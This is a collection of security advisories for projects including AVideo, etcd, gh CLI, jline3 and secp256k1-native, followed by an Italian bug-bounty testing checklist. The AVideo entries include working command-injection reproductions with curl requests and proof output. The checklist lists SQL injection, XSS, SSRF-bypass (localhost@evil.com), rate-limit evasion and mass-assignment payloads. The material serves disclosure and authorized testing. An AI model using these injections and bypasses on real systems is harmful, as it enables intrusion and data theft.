This is a variant of [CVE-2024-52308](https://github.com/advisories/GHSA-p2h2-3vg9-4p87). That remediation validated the SSH connection details for `gh codespace ssh` and `gh codespace logs`, but did not cover the equivalent Jupyter code path.

### Details

The vulnerability stems from the way GitHub CLI handles the server URL returned when starting a remote JupyterLab server:

1. A user runs `gh codespace jupyter -c <name>`, expecting a normal `https://` JupyterLab page.
2. The CLI retrieves a server URL from a process inside the Codespace and opens it in the user's browser without confirming that it is a web address.
3. A malicious Codespace returns a `vscode://` link in place of the expected JupyterLab address. The operating system passes the link to VS Code.
4. VS Code acts on the link. With a single trust prompt, this can result in code execution on the user's workstation.

The CLI trusts the URL provided by the Codespace and opens it as-is, without confirming that it is a loopback JupyterLab web address. The equivalent SSH commands received this validation in the CVE-2024-52308 fix, but the Jupyter command was not covered.

In `v2.96.0`, the GitHub CLI validates the Jupyter server URL before opening it, accepting only loopback `http` and `https` addresses.

### Impact

Any user who runs `gh codespace jupyter` against an untrusted Codespace.

Successful exploitation requires the victim to accept one VS Code "open URL" or Workspace Trust prompt.

## Remediation and Mitigation

1. Upgrade `gh` to `v2.96.0`.
2. Exercise caution when using `gh codespace jupyter` with untrusted Codespaces. Prefer Codespaces created from trusted sources, and prefer default or pre-built devcontainers.

titolo: GHSA-3wh4-j44w-pg92: etcd: CRL enforcement bypass on gRPC listener when `--listen-client-http-urls` is configured
descrizione:
### Impact
_What kind of vulnerability is it? Who is impacted?_

When etcd is configured with `--listen-client-http-urls` to split the HTTP and gRPC client endpoints onto separate listeners, the `--client-crl-file` Certificate Revocation List is not enforced on the gRPC listener. A client presenting a revoked certificate is correctly rejected by the HTTP endpoint but continues to authenticate successfully over gRPC.

### Patches
_Has the problem been patched? What versions should users upgrade to?_

This vulnerability is patched in the following versions:

- etcd 3.6.13
- etcd 3.5.32

### Workarounds
_Is there a way for users to fix or remediate the vulnerability without upgrading?_

If upgrading is not immediately possible, reduce exposure by restricting network access to etcd client ports using firewall rules or network policy so that only trusted components can reach the server. This limits the pool of clients that could exploit a revoked certificate but does not enforce CRL revocation.

### Reporter

Luis Toro ([@lobuhi](https://github.com/lobuhi) on Github)

titolo: GHSA-c4hm-4h84-2cf3: ruflo MCP bridge allows unauthenticated remote code execution in default Docker Compose deployments
descrizione:
The MCP bridge shipping in ruflo/docker-compose.yml exposed POST /mcp with no authentication. The docker-compose defaults bound the bridge and MongoDB to all interfaces. Combined, an unauthenticated network attacker could invoke tools/call → terminal_execute inside the bridge container, obtain a shell as node (uid 1000), read every provider API key from the container env, spawn attacker-controlled swarms on the victim's keys, and persist a poisoned pattern into the AgentDB learning store that steers future AI outputs for all users of the instance.

The tool blocklist that mentions terminal_execute was enforced only in the autopilot flow. POST /mcp and POST /mcp/:group bypassed it.

Fixed in ADR-166 Phase 1-3 (branch security/adr-166-mcp-bridge-rce, PR #2521):
- Bind loopback by default; fail-closed on public-bind opt-in without MCP_AUTH_TOKEN
- Bearer auth middleware (timingSafeEqual constant-time compare)
- Server-side executeTool gate for terminal_execute (MCP_ENABLE_TERMINAL=true opt-in)
- MongoDB --auth on by default; MONGO_INITDB_ROOT_PASSWORD required to boot
- read_only container + tmpfs
- CORS allowlist wiring
- CI regression locks (static + runtime + compose defaults)

Operators of any exposed instance MUST:
1. Firewall :3001 and :27017 immediately
2. Rotate OPENAI / GOOGLE / OPENROUTER / ANTHROPIC keys
3. Audit the AgentDB pattern store for injected agentdb_pattern-store entries; purge poisoned patterns. A patched redeploy alone does NOT undo poisoning.
4. Audit MongoDB for tampering

Credit: [Eli Ainhorn](https://www.linkedin.com/in/eli-ainhorn), Senior AI Vulnerability Researcher @ [Noma Security](https://noma.security) 

Reviewed by Dragan Spiridonov (ADR-166 co-author).

titolo: GHSA-g9x9-q7qj-6mv5: AVideo API FFmpeg process permits OS command injection via notifyCode/callback
descrizione:
### Summary

The standalone FFmpeg execution endpoint `plugin/API/standAlone/ffmpeg.json.php` builds a shell command string that is passed to `execAsync()` and run via `nohup sh -c "<command>"`. When the decrypted `codeToExec` payload produces a non-empty `avideoPath`, the endpoint appends a completion hook of the form:

```
 && php <script> notify=<escaped-json> notifyCode=<codeToExec->notifyCode> callback=<codeToExec->callback>
```

The `notify` value on this line is wrapped with `escapeshellarg()`, but the two adjacent fields `notifyCode` and `callback` are concatenated raw. Both fields originate from the same decrypted, attacker-controlled `codeToExec` object as `ffmpegCommand`, but neither passes through the `sanitizeFFmpegCommand()` denylist (only `ffmpegCommand` does) and neither is shell-escaped. An attacker who can craft a valid encrypted payload can therefore inject arbitrary shell commands into the `sh -c` context by placing shell metacharacters in `callback` or `notifyCode`, achieving OS command execution as the web-server user.

This is a residual sibling of the recently hardened `sanitizeFFmpegCommand()` denylist: the denylist now strips `; | ` < > & $ ( ) \n \r { }` from `ffmpegCommand`, but the two sibling fields on the same completion-hook line were never routed through it nor escaped, even though the `notify` value beside them on the very same line already is escaped.

### Vulnerable code

`plugin/API/standAlone/ffmpeg.json.php` (master HEAD, around lines 406-412):

```php
if (!empty($output['avideoPath'])) {
    if (file_exists($output['avideoPath'])) {
        unlink($output['avideoPath']);
    }
    $outputJson = escapeshellarg(json_encode($output));
    $ffmpegCommand .= " && php " . escapeshellarg(__DIR__ . "/ffmpeg.json.php") . " notify={$outputJson} notifyCode={$codeToExec->notifyCode} callback={$codeToExec->callback}";
}
```

`$outputJson` is escaped; `$codeToExec->notifyCode` and `$codeToExec->callback` are interpolated raw.

The only field that is sanitized earlier is `ffmpegCommand` (line ~129):

```php
$ffmpegCommand = !empty($codeToExec->ffmpegCommand) ? sanitizeFFmpegCommand($codeToExec->ffmpegCommand) : '';
```

`sanitizeFFmpegCommand()` (`plugin/API/standAlone/functions.php`, line ~105) strips shell metacharacters:

```php
$command = preg_replace('/[;|`<>&$()\n\r{}]/', '', $command);
```

`notifyCode` / `callback` never touch this function.

The composed string flows to `execAsync()` in `objects/functionsExec.php` (around line 705), which runs it via `sh -c`:

```php
$commandWithKeyword = "nohup sh -c \"$command & echo \\$! > /tmp/$keyword.pid\" > /dev/null 2>&1 &";
exec($commandWithKeyword, $output, $retval);
```

`addcslashes($command, '"')` earlier in `execAsync()` escapes only double quotes, not `;`, `$(...)`, backticks, etc., so injected metacharacters in `notifyCode` / `callback` reach the shell intact.

### Reachability

The completion-hook branch (`&& php ... notify=`) runs only when `$output['avideoPath']` is non-empty. `avideoPath` is set by the regex at line ~146:

```php
preg_match('/ [\'"]?(\/[0-9a-z_\/-]+\/videos\/([0-9a-z_\/-]+)\/([0-9a-z_-]+\.(mp4|mp3)))[\'"]?/i', $ffmpegCommand, $matches);
```

This is trivially satisfied by including a benign `/.../videos/<dir>/<name>.mp4` output path in `ffmpegCommand` (a normal FFmpeg command already contains one). The malicious `callback` / `notifyCode` need no metacharacter-free constraint because they bypass the denylist entirely.

### Privilege required

Same trust boundary as the parent command-injection fix in this file: an attacker who can craft a valid encrypted `codeToExec` payload with a valid `APISecret`. `_decryptString()` calls the platform `decryptString` API, which runs `encrypt_decrypt()` (AES-256-CBC; key = `hash('sha256', $global['saltV2'])`, iv = `substr(hash('sha256', $global['systemRootPath']), 0, 16)`). The decrypted payload is accepted when `payload->time` is within the last 30 seconds. The endpoint requires no interactive login.

### Reproduction (end-to-end, against master HEAD)

Deployed the master HEAD source (commit `8eaca9d5`, dated 2026-06-30) in a PHP 8.2 / Apache container backed by MySQL 8.0, ran the genuine platform installer (`install/checkConfiguration.php`) which created the database from `install/database.sql` and wrote `videos/configuration.php` with a freshly generated `salt` / `saltV2`, and enabled the API plugin. The `decryptString` and `isAPISecretValid` platform APIs were confirmed live over HTTP. `APISecret` is `md5($global['salt'] . $global['systemRootPath'] . 'API')` and matched the value stored by the plugin.

A `codeToExec` object was encrypted exactly as the platform does (`encryptString()`), with:
- `time` = now
- `ffmpegCommand` = `ffmpeg -i /var/www/html/AVideo/videos/x/in.mp4 -c copy /var/www/html/AVideo/videos/x/out.mp4` (contains an `avideoPath` so the completion hook fires)
- `callback` = `x;touch /tmp/avideo_cb_rce_1782909419_26863`

POST to the endpoint:

```
curl -s -X POST "http://<host>/plugin/API/standAlone/ffmpeg.json.php" \
  --data-urlencode "APISecret=<APISecret>" \
  --data-urlencode "codeToExecEncrypted=<encrypted codeToExec>"
```

Verbatim response (note the composed command: `notify='{...}'` is escaped, but `callback=x;touch /tmp/...` is raw):

```
{"error":false,"msg":"Command executed","command":"ffmpeg -i /var/www/html/AVideo/videos/x/in.mp4 -c copy /var/www/html/AVideo/videos/x/out.mp4 -metadata keyword='kwtest' > /var/www/html/AVideo/videos/ffmpegLogs/ffmpeg_kwtest.log  && php '/var/www/html/AVideo/plugin/API/standAlone/ffmpeg.json.php' notify='{\"avideoPath\":\"/var/www/html/AVideo/videos/x/in.mp4\",\"avideoRelativePath\":\"videos/x/in.mp4\",\"avideoFilename\":\"x\",\"videoBasename\":\"in.mp4\",\"avideoExstension\":\"mp4\"}' notifyCode=nc1 callback=x;touch /tmp/avideo_cb_rce_1782909419_26863 2>&1","pid":17212,"logFile":"/var/www/html/AVideo/videos/ffmpegLogs/ffmpeg_kwtest.log"}
```

The injected `touch` ran (marker created by the web-server user):

```
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:40 /tmp/avideo_cb_rce_1782909419_26863
```

The same result holds with the payload in `notifyCode` instead of `callback`:

```
... notifyCode=x;touch /tmp/avideo_nc_rce_1782909675_26515 callback=cb1 2>&1
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_nc_rce_1782909675_26515
```

Negative control 1 (benign `callback=benigncallback`, no metacharacters): same code path, marker NOT created:

```
... notifyCode=benignnotify callback=benigncallback 2>&1
ls: cannot access '/tmp/avideo_neg1_1782909646_19909': No such file or directory
```

Negative control 2 (the same `;touch` payload placed inside the guarded `ffmpegCommand` field instead): `sanitizeFFmpegCommand()` strips the `;`, so no injection occurs and the marker is NOT created. The composed command shows the semicolon removed (`out.mp4touch /tmp/...`), proving the gap is specific to the two unguarded sibling fields:

```
command: ...out.mp4touch /tmp/avideo_neg2_1782909660_14042 -metadata keyword='kwtest'...
ls: cannot access '/tmp/avideo_neg2_1782909660_14042': No such file or directory
```

Patched re-run (after applying the fix below): the payload is now single-quoted by `escapeshellarg()` and the marker is NOT created:

```
... notifyCode='nc1' callback='x;touch /tmp/avideo_cb_rce_PATCHED_1782909755_8511' 2>&1
ls: cannot access '/tmp/avideo_cb_rce_PATCHED_1782909755_8511': No such file or directory
```

### Impact

Arbitrary OS command execution on the AVideo host as the web-server user (the same user that owns the application files and configuration, including the database credentials and `saltV2`). From there an attacker can read and modify site data, pivot to the database, and persist. This is the full-severity command-execution outcome, reached through a field that the current sanitizer does not cover.

### Suggested fix

Escape both sibling fields with `escapeshellarg()`, mirroring the existing `$outputJson = escapeshellarg(...)` on the same line:

```php
$ffmpegCommand .= " && php " . escapeshellarg(__DIR__ . "/ffmpeg.json.php")
    . " notify=" . $outputJson
    . " notifyCode=" . escapeshellarg((string)$codeToExec->notifyCode)
    . " callback=" . escapeshellarg((string)$codeToExec->callback);
```

Equivalently, route `notifyCode` and `callback` through the same allowlist/denylist used for `ffmpegCommand`. Escaping at the concatenation site is preferred because it is the shell-quoting boundary and cannot be bypassed by later transformations.

### Credit

Reported by tonghuaroot.

titolo: GHSA-48qj-5wxh-m8hc: Cakephp twig-view unserialize Twig filter allows arbitrary object deserialization
descrizione:
### Impact
The `unserialize` filter has no restriction on which classes are allowed. This can be used as a deserialization remote-code-execution gadget.

### Patches
1.3.3 and 2.1.2 contain a fix for this issue. The fix may impact backwards compatibility if you are relying on deserializing PHP objects in your templates.

### Workarounds
Don't use the `unserialize` filter.

titolo: GHSA-j44m-77cc-p3cc: AVideo API vulnerable to OS command injection through an unescaped FFmpeg process keyword
descrizione:
### Summary

The helper `listFFmpegProcesses($keyword)` in `plugin/API/standAlone/functions.php` builds a shell pipeline by interpolating `$keyword` inside single quotes and running it with `exec()`:

```php
$command .= " | grep '$keyword'";
exec($command, $output, $status);
```

The two callers in `plugin/API/standAlone/ffmpeg.json.php` (the `list` mode and the `isKeywordRunning` mode) pass the RAW decrypted `codeToExec` field, not the sanitized `$keyword` variable that the endpoint allowlists elsewhere. Because the value is placed inside a single-quoted shell context with no escaping, a payload that closes the quote (for example `x'; touch /tmp/marker #`) breaks out and injects an arbitrary command that runs via `exec()`'s `/bin/sh -c`. An attacker who can craft a valid encrypted payload achieves OS command execution as the web-server user.

### Vulnerable code

Sink — `plugin/API/standAlone/functions.php`, `listFFmpegProcesses()` (around lines 139-147):

```php
function listFFmpegProcesses($keyword = '')
{
    $command = "ps -eo pid,etime,%cpu,%mem,cmd | grep '[f]fmpeg'";

    if (!empty($keyword)) {
        $command .= " | grep '$keyword'";   // $keyword interpolated inside single quotes, unescaped
    }

    exec($command, $output, $status);       // runs via /bin/sh -c
```

Callers — `plugin/API/standAlone/ffmpeg.json.php` pass the RAW decrypted field, bypassing the allowlisting applied to the local `$keyword` variable. That local variable is built at line ~136 as `$keyword = preg_replace('/[^a-zA-Z0-9_-]/', '', $codeToExec->keyword)`, but the two callers below never use it:

```php
// list mode (line ~221)
$list = listFFmpegProcesses($codeToExec->keyword);

// isKeywordRunning mode (line ~341)
$list = listFFmpegProcesses($codeToExec->isKeywordRunning);
```

Neither mode is gated by the `$isStandAlone` check that guards the `deleteFolder` / `deleteFile` modes, so both run on any AVideo instance.

### Reachability

Reached by sending a `codeToExec` payload with either `list = 1` and a malicious `keyword`, or with a malicious `isKeywordRunning` value. Both modes call `listFFmpegProcesses()` with the raw field before any allowlist is applied to it.

### Privilege required

Same trust boundary as the parent command-injection fix in this endpoint: an attacker who can craft a valid encrypted `codeToExec` payload with a valid `APISecret`. `_decryptString()` calls the platform `decryptString` API (AES-256-CBC; key = `hash('sha256', $global['saltV2'])`, iv = `substr(hash('sha256', $global['systemRootPath']), 0, 16)`), and the payload is accepted when `payload->time` is within the last 30 seconds. No interactive login is required.

### Reproduction (end-to-end, against master HEAD)

Deployed the master HEAD source (commit `8eaca9d5`, dated 2026-06-30) in a PHP 8.2 / Apache container backed by MySQL 8.0, ran the genuine platform installer, enabled the API plugin, and confirmed the `decryptString` / `isAPISecretValid` platform APIs live over HTTP. `APISecret` is `md5($global['salt'] . $global['systemRootPath'] . 'API')`.

A `codeToExec` was encrypted (`encryptString()`) with:
- `time` = now
- `list` = 1
- `keyword` = `x'; touch /tmp/avideo_kw_rce_1782909694_20509 #`

POST:

```
curl -s -X POST "http://<host>/plugin/API/standAlone/ffmpeg.json.php" \
  --data-urlencode "APISecret=<APISecret>" \
  --data-urlencode "codeToExecEncrypted=<encrypted codeToExec>"
```

Verbatim response (normal list output while the injection ran as a side effect):

```
{"error":false,"msg":"","list":[]}
```

The injected `touch` ran (marker created by the web-server user):

```
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_kw_rce_1782909694_20509
```

Same result through the `isKeywordRunning` mode (payload `x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #`):

```
{"error":true,"msg":"No FFmpeg process found with the given keyword","isRunning":false,"keyword":"x'; touch /tmp/avideo_ikr_rce_1782909715_3303 #"}
-rw-r--r-- 1 www-data www-data 0 Jul  1 12:41 /tmp/avideo_ikr_rce_1782909715_3303
```

Negative control (benign alphanumeric keyword `benignkw123`, `list` mode): same code path, marker NOT created:

```
{"error":false,"msg":"","list":[]}
ls: cannot access '/tmp/avideo_kwneg_1782909713_28529': No such file or directory
```

Patched re-run (after applying `escapeshellarg()` as below): the injection is neutralized and the marker is NOT created:

```
{"error":false,"msg":"","list":[]}
ls: cannot access '/tmp/avideo_kw_rce_PATCHED_1782909782_8294': No such file or directory
```

### Impact

Arbitrary OS command execution on the AVideo host as the web-server user (the account that owns the application files, configuration, database credentials, and `saltV2`). An attacker can read and modify site data, pivot to the database, and persist. This is a distinct sink (the `grep` single-quote breakout in `listFFmpegProcesses`) from the completion-hook concatenation elsewhere in the same endpoint, and it is reachable through two different modes.

### Suggested fix

Escape the keyword at the shell boundary in `listFFmpegProcesses()`:

```php
if (!empty($keyword)) {
    $command .= " | grep " . escapeshellarg($keyword);
}
```

Alternatively, have the `list` / `isKeywordRunning` callers pass the already-allowlisted `$keyword` value instead of the raw decrypted field. Escaping inside `listFFmpegProcesses()` is preferred because it protects every caller.

### Credit

Reported by tonghuaroot.

titolo: GHSA-9x82-4j54-863h: isomorphic-git allows unbounded memory allocation from attacker-controlled delta target size (DoS)
descrizione:
### Summary
When applying a delta object from a packfile, isomorphic-git reads a **server-controlled** `targetSize` and calls `Buffer.alloc(targetSize)` with no upper bound. A single malicious HTTP response to `git.clone()`/`git.fetch()` can force a ~2 GB allocation → memory exhaustion / DoS (process killed on memory-constrained hosts).

### Details
`src/utils/applyDelta.js`:

```js
const sourceSize = readVarIntLE(reader)
const targetSize = readVarIntLE(reader)   // attacker-controlled
…
target = Buffer.alloc(targetSize)
```

A pack with one `OBJ_REF_DELTA` whose header declares `targetSize = 0x7FFFFFFF` (~2 GB) and a 1-byte op causes the full allocation up front. The subsequent size-mismatch error is swallowed in `GitPackIndex.fromPack`, so on a host with spare RAM it silently wastes ~2 GB; on a small host the OS `SIGKILL`s the process.

#### Canonical git behavior (divergence)
git rejects the same 78-byte pack in ~96 ms — `error: delta replay has gone wild` / `fatal: … failed to apply delta` — with no large allocation and no hang (it bounds delta replay against the declared size rather than trusting it).

### PoC
`https://github.com/spiceoverflow/av4-oom` — open in a Codespace; a single clone/fetch against the bundled server, run under `--max-old-space-size=256`:

```
[AV-4] *** OOM ALLOCATION CONFIRMED — Buffer.alloc(targetSize) RAN ***
[AV-4] External (Buffer) memory rose by 2048 MB during clone.
```

(The allocation is off-heap, so a Node heap cap does not mitigate it.)

### Impact
A denial of service via unbounded memory allocation: a single response from a malicious or MitM'd server to `git.clone()`/`git.fetch()` forces a multi-gigabyte allocation, crashing the process on memory-constrained hosts.

Any application or service that clones or fetches from untrusted/compromised remotes with isomorphic-git — most acutely containers, serverless functions, and small VMs, where the OS OOM-kills the process.

### Suggested fix
Don't pre-allocate the untrusted `targetSize`: build the result from the actual delta ops and validate the total against `targetSize` before concatenating (and/or cap it against the advertised pack size).

titolo: GHSA-2v9w-34q6-wpqx: jline3 leads to ReDoS in Built-in Less Viewer Search
descrizione:
### Summary

The JLine3 built-in `less` pager compiles user-supplied search patterns directly as
Java regular expressions with no sanitization, timeout, or backtracking bound. A
malicious pattern such as `(a+)+b` can trigger catastrophic backtracking and hang the
session thread at 100% CPU. In deployments that expose `less` over Telnet or SSH,
this becomes a denial-of-service issue for the affected session and can be used to
exhaust a bounded session pool.

### Details

`Less.getPattern()` in `builtins/src/main/java/org/jline/builtins/Less.java` compiles
the user-controlled search string directly with `Pattern.compile()`:

```java
private Pattern getPattern(boolean doDisplayPattern) {
    Pattern compiled = null;
    String _pattern = doDisplayPattern ? displayPattern : pattern;
    if (_pattern != null) {
        boolean insensitive =
                ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
        compiled = Pattern.compile(
                "(" + _pattern + ")", insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
    }
    return compiled;
}
```

The resulting pattern is then applied repeatedly against file content with
`compiled.matcher(line).find()` in the `less` search path. Because Java's
`java.util.regex` engine is backtracking-based and has no built-in timeout, patterns
with nested quantifiers can take exponential time on non-matching input.

Affected source locations:
- `builtins/src/main/java/org/jline/builtins/Less.java`
- `getPattern(boolean doDisplayPattern)`
- search callers using `compiled.matcher(line).find()`

### PoC

1. Create a file with a long run of `a` characters:

```sh
printf 'aaaaaaaaaaaaaaaaaaaaaaaaa\n' > /tmp/testfile.txt
```

2. Open the file with the JLine3 `less` viewer.
3. Press `/` to enter search mode.
4. Enter the pattern `(a+)+b` and press Enter.

Expected result:
- The `less` session stops responding.
- The session thread consumes high CPU.

Variation:
- The same behavior can be triggered through the display-filter path using `&` because
  that path also compiles user input as a raw Java regex.

Reproduction environment:
- JLine3 on x86_64 Linux
- OpenJDK 25.0.2

### Impact

This is a denial-of-service vulnerability caused by catastrophic regex backtracking.
Any application embedding `org.jline:jline-builtins` and exposing the `less` viewer
is impacted. In local use, the affected user can hang their own session. In multi-user
Telnet or SSH deployments, one attacker can occupy one session thread indefinitely and
multiple attackers or sessions can exhaust the server's available worker pool.

### Suggested Fix

The preferred fix for the current git head is to move user-controlled regex matching
to a linear-time engine such as RE2/J.

Suggested patch:

```diff
diff --git a/builtins/pom.xml b/builtins/pom.xml
--- a/builtins/pom.xml
+++ b/builtins/pom.xml
@@
         <dependency>
+            <groupId>com.google.re2j</groupId>
+            <artifactId>re2j</artifactId>
+            <version>1.8</version>
+        </dependency>
+        <dependency>
             <groupId>org.jline</groupId>
             <artifactId>jline-reader</artifactId>
         </dependency>

diff --git a/builtins/src/main/java/org/jline/builtins/Less.java b/builtins/src/main/java/org/jline/builtins/Less.java
--- a/builtins/src/main/java/org/jline/builtins/Less.java
+++ b/builtins/src/main/java/org/jline/builtins/Less.java
@@
-import java.util.regex.Pattern;
+import com.google.re2j.Pattern;
@@
         if (_pattern != null) {
             boolean insensitive =
                     ignoreCaseAlways || ignoreCaseCond && _pattern.toLowerCase().equals(_pattern);
             compiled = Pattern.compile(
                     "(" + _pattern + ")",
                     insensitive ? Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE : 0);
         }
```

If introducing RE2/J is not acceptable, a weaker fallback is to perform regex matching
in a worker with a strict timeout and reject patterns that exceed the time budget.

### Credits

This issue was identified by Michał Majchrowicz and Marcin Wyczechowski, members of the AFINE Team.

titolo: GHSA-vp2j-gqfm-r3cf: secp256k1-native has a compiler-induced timing side channel in scalar multiplication
descrizione:
## Summary

`Point#mul` — the default, constant-time scalar multiplication and the library's headline secret-scalar operation — could leak timing information about the secret scalar (a private key or ECDSA-style nonce in a downstream consumer) **not because of a source-level bug, but because the compiler reconstructed a branch from branchless source.**

The Montgomery ladder selects between point candidates with `uint256_select`, written deliberately branchlessly as `r = (a & ~mask) | (b & mask)` with a mask that is all-ones or all-zeros. GCC 15.2 at `-O2` recognises this select idiom, reconstructs the original boolean condition, and emits a secret-dependent conditional jump (`je`/`jne`). The branch's taken/not-taken timing correlates with the secret scalar bits flowing through the ladder.

This silently undid the 0.17.0 fix for the historical |t|=875 infinity-branch leak, which had relied on `uint256_select` compiling to branchless code.

## Impact

A timing side-channel on the secret scalar in constant-time scalar multiplication. For a consumer that calls `Point#mul` (or the native `scalar_multiply_ct`) on a secret key or nonce and exposes timing to an attacker (e.g. an online signing oracle), repeated measurements can statistically recover scalar bits — the classic ECC private-key/nonce timing-attack setting (cf. Brumley–Boneh). The leak is in the *compiled binary*; the source is correct, so source review and the deterministic ctgrind check on a *non-reconstructing* toolchain do not reveal it.

Pre-1.0 with no published RubyGems dependents, so this is handled as fix-publish-and-document: full GHSA + CVE record without a coordinated downstream-notification timeline. The CVE is filed for citability so the empirical record (paper → review → compiler regression → fix) is permanent and searchable.

## Affected configurations

The defect is a property of the (source, compiler, flags) triple, not the source alone:

- **Source:** any pre-`0.18.0` build. The branchless `uint256_select` was introduced with the 0.17.0 `jp_add_internal` |t|=875 fix; the pre-0.17 versions on RubyGems (0.15, 0.16) had different CT issues which the 0.17.0 fix addressed, so the safest user guidance is "upgrade to 0.18.0 from any earlier version".
- **Compiler:** one that reconstructs the all-0s/all-1s select into a branch. Confirmed: **GCC 15.2.0, `-O2`**. The extension ships with `-O2` (`extconf.rb` appends it), so the shipped binary on this compiler is affected.
- **Not affected:** the pure-Ruby path (different code; separately not claimed constant-time), and toolchains that emit `cmov` or pure bitwise ops here (the original review's toolchain).

## Patch (v0.18.0)

Introduces a value barrier (libsecp256k1/BoringSSL pattern) and routes every constant-time select mask through it:

```c
static inline uint64_t ct_value_barrier_u64(uint64_t x) {
#if defined(__GNUC__) || defined(__clang__)
    __asm__ volatile("" : "+r"(x));
#endif
    return x;
}

static inline uint64_t ct_mask_u64(uint64_t flag) {
    return ct_value_barrier_u64(-(uint64_t)(flag != 0));
}
```

Applied to all nine mask-select sites: `uint256_select`; `fred`, `fadd`, `fsub`, `fneg`; `scalar_reduce`, `scalar_add`; the `jp_double` infinity select; and the ladder `cswap`. Only `uint256_select` actively branchified under GCC 15.2/`-O2`; the rest are hardened as defence-in-depth.

## Workarounds (for unpatched users)

- **Upgrade to v0.18.0** (recommended).
- Or: compile the extension at `-O0`/`-O1`, or with a compiler that does not reconstruct the select (verify with `objdump -dl`) — fragile, not recommended.
- Do not call `Point#mul` on secret scalars from a timing-observable context until patched.

## Verification (reproducible)

Reference machine: AMD Ryzen 9 9950X (Zen 5), microcode `0xb404023`, Ubuntu 26.04 / Linux 7.0.0-14, GCC 15.2.0; `systemd-detect-virt = none`; turbo off, `performance` governor (min=max), SMT off, harness pinned with `taskset -c <core>` under `chrt -f`.

- **Deterministic (ctgrind):** before — "Conditional jump or move depends on uninitialised value" at the `uint256_select` source lines via `jp_add_internal` → `scalar_multiply_ct_internal`. After — clean, exit 0.
- **Disassembly:** before — `je`/`jne` attributed to the select source lines under `objdump -dl`. After — none (0 conditional jumps / `cmov` at any select line).
- **Statistical (dudect, bare metal):** before — `scalar_multiply_ct_internal` |t| ≈ 21 (stable across runs). After — mean |t| = 0.68, max 1.57, 0/20 runs over the 4.5 threshold.
- **Functional:** `bundle exec rspec` → 416 examples, 0 failures.

## Lasting control

Bare-metal dudect is now a **required pre-tag release gate**, re-run whenever the known-good compiler version changes. The deterministic ctgrind check remains the primary CT evidence but runs against CI's compiler; only the statistical bare-metal run observes the timing of the binary that actually ships. **A constant-time source is not a constant-time binary.**

## Related

- In-repo advisory: [docs/advisories/0001-compiler-reconstructed-ct-branch.md](https://github.com/sgbett/secp256k1-native/blob/master/docs/advisories/0001-compiler-reconstructed-ct-branch.md)
- [docs/security.md — Empirical timing verification](https://github.com/sgbett/secp256k1-native/blob/master/docs/security.md#empirical-timing-verification)
- [docs/risks.md — What works against it](https://github.com/sgbett/secp256k1-native/blob/master/docs/risks.md#what-works-against-it)
- [docs/security-review-v1.md — Finding H-2](https://github.com/sgbett/secp256k1-native/blob/master/docs/security-review-v1.md)
- [docs/timing-verification-runbook.md](https://github.com/sgbett/secp256k1-native/blob/master/docs/timing-verification-runbook.md)

titolo: CVE-2026-120705: OSGeo GeoServer XML Injection Vulnerability
descrizione:
OsGeo GeoServer contains an XML injection vulnerability that allows an unauthenticated remote attacker to cause the server to read local text files accessible to the GeoServer process or fetch attacker-specified HTTP or HTTPS URLs via a crafted ID parameter in the WFS 2.0 GetFeatureById stored query. This vulnerability can be chained with CVE-2026-129244, CVE-2026-129243, CVE-2026-129245, and CVE-2026-129242 to achieve unauthenticated remote code execution on an affected GeoServer instance.

Vendor: OSGeo
Product: GeoServer
Added: 2026-11-27
Due Date: 2026-11-30

Documenta sempre con screenshot prima/dopo

Verifica authorization a livello di field, non solo oggetto

testingTechniques.name: Mass Assignment
testingTechniques.description: Inietta campi non previsti nel body della richiesta
steps: Intercetta una richiesta PUT/POST normale
Aggiungi campi come: isAdmin true, role admin, verified true
Verifica se vengono accettati e modificano il tuo account
Testa con campi PII: ssn, creditCard, password
Prova con campi interni: internal_id, user_type

steps: Crea due account su due browser diversi
Cattura tutte le richieste con oggetti (es. /api/orders/123)
Sostituisci l'ID con uno dell'altro account
Se ottieni risposta 200 con dati altrui = BOLA confermato
Documenta sempre con screenshot prima/dopo

steps: Identifica endpoint con rate limit (login, OTP, search)
Prova header X-Forwarded-For, X-Real-IP, X-Originating-IP
Cambia case del path: /API/Login vs /api/login
Aggiungi parametri irrilevanti: ?a=1&a=2
Usa IP rotation con proxy/VPN

testingTechniques.name: GraphQL Specific
testingTechniques.description: Testa vulnerabilità specifiche di GraphQL
steps: Abilita introspection con query: {__schema{types{name}}}
Usa batch query per rate limit bypass
Cerca field deprecated o hidden
Testa nested query DoS con depth limiting
Verifica authorization a livello di field, non solo oggetto

testingTechniques.description: Mappa tutte le superfici attaccabili, endpoint, sottodomini e tecnologie usate
steps: Esegui subdomain enumeration con subfinder, amass, assetfinder
Usa httpx per identificare servizi attivi
Fai crawling con katana o gospider per scoprire endpoint
Identifica tecnologie con Wappalyzer o whatweb
Leggi robots.txt, sitemap.xml, security.txt

testingTechniques.name: Test IDOR / BOLA
testingTechniques.description: Verifica controlli di accesso sostituendo ID utente/risorsa nelle API/URL
steps: Crea due account (A e B) sul programma
Identifica endpoint con ID numerici (/api/users/123, /orders/456)
Sostituisci ID di A con ID di B nelle richieste
Verifica se ricevi dati di B senza autorizzazione
Testa anche UUID e ID encoded in base64

testingTechniques.name: SQL Injection
testingTechniques.description: Testa parametri input per injection SQL classiche e blind
steps: Identifica parametri con sqlmap --crawl
Testa manualmente con payload base: apice, doppi apici, --, #
Usa sqlmap -u "URL" --dbs --batch per conferma
Testa anche blind SQL con time-based: ' OR SLEEP(5)--
Verifica second-order SQL injection in update profile

testingTechniques.name: XSS (Cross-Site Scripting)
testingTechniques.description: Inietta JavaScript in input riflessi o memorizzati
steps: Testa ogni parametro riflesso con: script alert 1 script
Verifica escaping di <, >, ", apice
Testa in attributi HTML con onmouseover
Usa event handler: img src x onerror alert 1
Testa stored XSS in campi profilo, commenti, recensioni

testingTechniques.name: SSRF (Server-Side Request Forgery)
testingTechniques.description: Forza il server a fare richieste verso risorse interne
steps: Identifica parametri URL: ?url=, ?image=, ?redirect=
Testa con 127.0.0.1, 169.254.169.254 (cloud metadata)
Bypassa filtri con localhost@evil.com, 0.0.0.0
Usa DNS rebinding con tools come singularity
Verifica accesso a metadata AWS/GCP/Azure

testingTechniques.name: Authentication Bypass
testingTechniques.description: Trova modi per bypassare login, OTP, 2FA
